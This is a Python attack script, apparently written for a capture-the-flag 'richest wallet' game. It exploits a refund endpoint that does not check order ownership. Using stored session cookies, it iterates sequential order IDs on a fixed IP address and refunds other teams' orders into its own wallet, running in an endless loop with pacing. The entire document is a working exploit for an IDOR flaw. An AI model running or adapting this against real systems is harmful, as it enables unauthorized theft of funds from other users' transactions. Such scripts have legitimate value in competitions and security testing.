#!/usr/bin/env python3
"""Reseau Fortune (Koth 'richest wallet' hill) -- refund IDOR sweeper.

/api/refund does not check order ownership: refunding ANY order_id credits
OUR wallet/net_gain with that order's amount, regardless of which team
originally placed it. Orders are a global sequential counter shared by all
teams. This sweeper walks forward from the last known max order_id,
refunding anything new and unrefunded as other teams keep buying things.

Deliberately NOT a flood: polls in modest bursts with a backoff when it
hits the current ceiling (no orders beyond X yet), single sequential
connection, a few seconds between sweeps.
"""
import json
import time
import urllib.request
import urllib.error
import http.cookiejar

BASE = "http://13.37.197.230:28493"
COOKIE_FILE = "cookies.txt"

jar = http.cookiejar.MozillaCookieJar(COOKIE_FILE)
jar.load(ignore_discard=True, ignore_expires=True)
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def call(path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data,
                                  headers={"Content-Type": "application/json"},
                                  method="POST" if body is not None else "GET")
    try:
        resp = opener.open(req, timeout=8)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except Exception as e:
        return None, {"error": str(e)}


def main():
    next_id = 1
    harvested = 0
    sweeps = 0
    while True:
        sweeps += 1
        misses_in_a_row = 0
        while misses_in_a_row < 3:
            status, j = call("/api/refund", {"order_id": next_id})
            if j.get("ok"):
                amt = j.get("refunded", 0)
                harvested += amt
                print(f"[sweep {sweeps}] order {next_id}: +{amt} (total harvested this run: {harvested})", flush=True)
                next_id += 1
                misses_in_a_row = 0
            elif j.get("error") == "commande introuvable":
                misses_in_a_row += 1
                next_id += 1 if misses_in_a_row < 3 else 0
            elif j.get("error") == "déjà remboursée":
                next_id += 1
                misses_in_a_row = 0
            else:
                print(f"[sweep {sweeps}] order {next_id}: unexpected {status} {j}", flush=True)
                next_id += 1
                misses_in_a_row = 0
            time.sleep(0.3)
        status, me = call("/api/me")
        print(f"[sweep {sweeps}] me={me}", flush=True)
        time.sleep(15)


if __name__ == "__main__":
    main()
